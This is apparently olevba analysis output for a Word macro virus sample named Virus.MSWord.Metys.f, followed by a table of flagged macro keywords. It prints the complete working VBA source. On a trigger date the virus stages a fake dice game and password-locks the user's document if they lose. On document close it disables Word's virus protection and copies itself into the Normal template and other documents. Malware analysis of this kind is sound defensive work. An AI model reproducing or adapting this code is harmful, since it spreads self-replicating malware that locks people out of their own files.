olevba 0.60.1.dev3 on Python 3.8.10 - http://decalage.info/python/oletools
===============================================================================
FILE: Virus.MSWord.Metys.f-07c0114a7e1af4dc8a47a0acf0103dff2a4c6ac0
Type: OLE
-------------------------------------------------------------------------------
VBA MACRO ThisDocument.cls 
in file: Virus.MSWord.Metys.f-07c0114a7e1af4dc8a47a0acf0103dff2a4c6ac0 - OLE stream: 'Macros/VBA/ThisDocument'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 

Private Sub Document_Open()
If Day(Date) = 7 And Month(Date) = 2 Then
     MsgBox "Happy Birthday Jess! To celebrate, we're going to see how lucky you are " & Application.UserName & ". Click the OK button below to roll a number. If your number matches that of the dealer, you win!"
     X = Int((9 * Rnd) + 1)
     Y = Int((9 * Rnd) + 1)
          If X = Y Then
               MsgBox "You roll a " & X & " and the dealer rolls a " & Y & ". You win!"
               Exit Sub
          Else
               MsgBox "You roll a " & X & " and the dealer rolls a " & Y & ". I'm sorry, but you lost. Better luck next time!"
               For i = 1 To 14
                    RndNumber = Int((9 * Rnd) + 0)
                    X = X & RndNumber
               Next i
                    ActiveDocument.Words.First = "YOU LOSE! "
                    ActiveDocument.Password = X
                    ActiveDocument.SaveAs FileName:=ActiveDocument.FullName
                    ActiveDocument.Close
          End If
End If
Exit Sub
End Sub

Private Sub Document_Close()
On Error GoTo Out
Options.VirusProtection = False
Options.SaveNormalPrompt = False
Options.ConfirmConversions = False
AD = ActiveDocument.VBProject.VBComponents.Item(1).codemodule.CountOfLines
NT = NormalTemplate.VBProject.VBComponents.Item(1).codemodule.CountOfLines
If NT > 55 And AD > 0 Then GoTo Out
If NT < 55 Then
     Set host = NormalTemplate.VBProject.VBComponents.Item(1)
     ActiveDocument.VBProject.VBComponents(1).Export "C:\System.dat"
     host.codemodule.AddFromFile ("C:\System.dat")
     With host.codemodule
     For X = 1 To 4
     .DeleteLines 1
     Next X
     End With
     Kill ("C:\System.dat")
End If
If AD = 0 Then
     Set host = ActiveDocument.VBProject.VBComponents.Item(1)
     NormalTemplate.VBProject.VBComponents(1).Export "C:\System.dat"
     host.codemodule.AddFromFile ("C:\System.dat")
     With host.codemodule
     For X = 1 To 4
     .DeleteLines 1
     Next X
     End With
     Kill ("C:\System.dat")
End If
Out:
ActiveDocument.SaveAs FileName:=ActiveDocument.FullName
End Sub

+----------+--------------------+---------------------------------------------+
|Type      |Keyword             |Description                                  |
+----------+--------------------+---------------------------------------------+
|AutoExec  |Document_Close      |Runs when the Word document is closed        |
|AutoExec  |Document_Open       |Runs when the Word or Publisher document is  |
|          |                    |opened                                       |
|Suspicious|Kill                |May delete a file                            |
|Suspicious|VBProject           |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|VBComponents        |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|codemodule          |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|System              |May run an executable file or a system       |
|          |                    |command on a Mac (if combined with           |
|          |                    |libc.dylib)                                  |
+----------+--------------------+---------------------------------------------+

